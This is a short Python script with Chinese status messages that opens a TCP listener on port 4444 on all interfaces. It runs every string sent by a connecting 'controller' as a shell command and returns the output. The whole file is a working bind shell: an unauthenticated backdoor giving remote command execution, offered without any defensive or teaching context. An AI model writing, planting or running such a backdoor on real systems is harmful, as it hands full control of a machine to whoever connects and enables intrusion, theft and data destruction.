import socket
import subprocess

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 4444))
server.listen(1)
print('等待控制端连接...')

client, addr = server.accept()
print('控制端已连接:', addr)

while True:
    cmd = client.recv(4096).decode()
    if not cmd or cmd == 'exit':
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    if output == '':
        output = '命令执行完成（无输出）'
    client.send(output.encode())

client.close()
server.close()